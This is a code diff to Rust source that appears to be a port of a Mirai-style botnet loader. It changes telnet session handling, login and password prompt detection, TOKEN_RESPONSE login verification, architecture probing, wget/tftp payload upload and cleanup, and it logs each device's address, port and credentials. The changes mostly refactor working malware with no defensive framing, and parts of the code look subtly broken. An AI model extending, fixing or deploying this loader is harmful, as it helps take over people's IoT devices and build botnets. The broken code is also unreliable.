@@ -1,8 +1,8 @@
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, SystemTime};
 use std::net::TcpStream;
-use std::io::{self, Read, Write};
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::io::{Read, Write};
+use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 
 #[derive(Debug)]
 struct Connection {
@@ -47,9 +47,9 @@ struct ConnectionInfo {
 
 #[derive(Debug)]
 struct Server {
-    total_successes: usize,
-    total_failures: usize,
-    curr_open: usize,
+    total_successes: AtomicUsize,
+    total_failures: AtomicUsize,
+    curr_open: AtomicUsize,
 }
 
 #[derive(Debug)]
@@ -91,7 +91,7 @@ impl Connection {
 
             if let Some(srv) = &self.srv {
                 if self.success.load(Ordering::SeqCst) {
-                    srv.total_successes += 1;
+                    srv.total_successes.fetch_add(1, Ordering::SeqCst);
                     eprintln!("OK|{:?} {}:{} {}:{} {}",
                         self.info.addr,
                         self.info.port,
@@ -99,7 +99,7 @@ impl Connection {
                         self.info.pass,
                         self.info.arch);
                 } else {
-                    srv.total_failures += 1;
+                    srv.total_failures.fetch_add(1, Ordering::SeqCst);
                     eprintln!("ERR|{:?} {}:{} {}:{} {}",
                         self.info.addr,
                         self.info.port,
@@ -113,6 +113,10 @@ impl Connection {
 
             if let Some(fd) = self.fd.take() {
                 let _ = fd.shutdown(std::net::Shutdown::Both);
+            }
+
+            if let Some(srv) = &self.srv {
+                srv.curr_open.fetch_sub(1, Ordering::SeqCst);
             }
         }
     }
@@ -140,16 +144,33 @@ impl Connection {
                         break;
                     }
                     if ptr[2] != 31 {
-                        goto_iac_wont!(ptr);
+                        for i in 0..3 {
+                            if ptr[i] == 0xfd {
+                                ptr[i] = 0xfc;
+                            } else if ptr[i] == 0xfb {
+                                ptr[i] = 0xfd;
+                            }
+                        }
+                        let _ = self.fd.as_ref().unwrap().write_all(&ptr[..3]);
+                        ptr = &ptr[3..];
+                        consumed += 3;
+                    } else {
+                        ptr = &ptr[3..];
+                        consumed += 3;
+                        let _ = self.fd.as_ref().unwrap().write_all(&tmp1);
+                        let _ = self.fd.as_ref().unwrap().write_all(&tmp2);
                     }
-
+                } else {
+                    for i in 0..3 {
+                        if ptr[i] == 0xfd {
+                            ptr[i] = 0xfc;
+                        } else if ptr[i] == 0xfb {
+                            ptr[i] = 0xfd;
+                        }
+                    }
+                    let _ = self.fd.as_ref().unwrap().write_all(&ptr[..3]);
                     ptr = &ptr[3..];
                     consumed += 3;
-
-                    let _ = self.fd.as_mut().unwrap().write_all(&tmp1);
-                    let _ = self.fd.as_mut().unwrap().write_all(&tmp2);
-                } else {
-                    goto_iac_wont!(ptr);
                 }
             }
         }
@@ -160,6 +181,8 @@ impl Connection {
     fn consume_login_prompt(&self) -> Option<usize> {
         self.rdbuf[..self.rdbuf_pos].iter().rposition(|&c| {
             c == b':' || c == b'>' || c == b'$' || c == b'#' || c == b'%'
+        }).or_else(|| {
+            util_memsearch(&self.rdbuf, b"ogin").or(util_memsearch(&self.rdbuf, b"enter"))
         })
     }
 
@@ -167,8 +190,7 @@ impl Connection {
         self.rdbuf[..self.rdbuf_pos].iter().rposition(|&c| {
             c == b':' || c == b'>' || c == b'$' || c == b'#' || c == b'%'
         }).or_else(|| {
-            let password_prompt = b"assword";
-            util_memsearch(&self.rdbuf, &password_prompt)
+            util_memsearch(&self.rdbuf, b"assword")
         })
     }
 
@@ -179,8 +201,7 @@ impl Connection {
     }
 
     fn consume_verify_login(&self) -> Option<usize> {
-        let token_response = b"TOKEN_RESPONSE";
-        util_memsearch(&self.rdbuf, &token_response)
+        util_memsearch(&self.rdbuf, TOKEN_RESPONSE.as_bytes())
     }
 
     fn consume_psoutput(&mut self) -> usize {
@@ -256,7 +277,7 @@ impl Connection {
         let token_response = b"TOKEN_RESPONSE";
         if let Some(end_pos) = util_memsearch(&self.rdbuf, &token_response) {
             let mut total_offset = 0;
-            while let Some(offset) = util_memsearch(&self.rdbuf[total_offset..end_pos], VERIFY_STRING_CHECK) {
+            while let Some(offset) = util_memsearch(&self.rdbuf[total_offset..end_pos], VERIFY_STRING_CHECK.as_bytes()) {
                 total_offset += offset;
 
                 if let Some(mut line) = self.rdbuf[total_offset..].split(|&c| c == b'\n').next() {
@@ -275,8 +296,7 @@ impl Connection {
     }
 
     fn consume_copy_op(&self) -> Option<usize> {
-        let token_response = b"TOKEN_RESPONSE";
-        util_memsearch(&self.rdbuf, &token_response)
+        util_memsearch(&self.rdbuf, TOKEN_RESPONSE.as_bytes())
     }
 
     fn consume_arch(&mut self) -> usize {
@@ -388,8 +408,7 @@ impl Connection {
     }
 
     fn upload_wget(&self) -> Option<usize> {
-        let token_response = b"TOKEN_RESPONSE";
-        util_memsearch(&self.rdbuf, &token_response)
+        util_memsearch(&self.rdbuf, TOKEN_RESPONSE.as_bytes())
     }
 
     fn upload_tftp(&self) -> Option<isize> {
@@ -419,28 +438,12 @@ impl Connection {
     }
 
     fn consume_cleanup(&self) -> Option<usize> {
-        let token_response = b"TOKEN_RESPONSE";
-        util_memsearch(&self.rdbuf, &token_response)
+        util_memsearch(&self.rdbuf, TOKEN_RESPONSE.as_bytes())
     }
 }
 
 fn util_memsearch(haystack: &[u8], needle: &[u8]) -> Option<usize> {
     haystack.windows(needle.len()).position(|window| window == needle)
-}
-
-macro_rules! goto_iac_wont {
-    ($ptr:ident) => {
-        for i in 0..3 {
-            if $ptr[i] == 0xfd {
-                $ptr[i] = 0xfc;
-            } else if $ptr[i] == 0xfb {
-                $ptr[i] = 0xfd;
-            }
-        }
-        let _ = self.fd.as_ref().unwrap().write_all(&$ptr[..3]);
-        $ptr = &$ptr[3..];
-        consumed += 3;
-    };
 }
 
 fn can_consume(conn: &Connection, ptr: &[u8], amount: usize) -> bool {
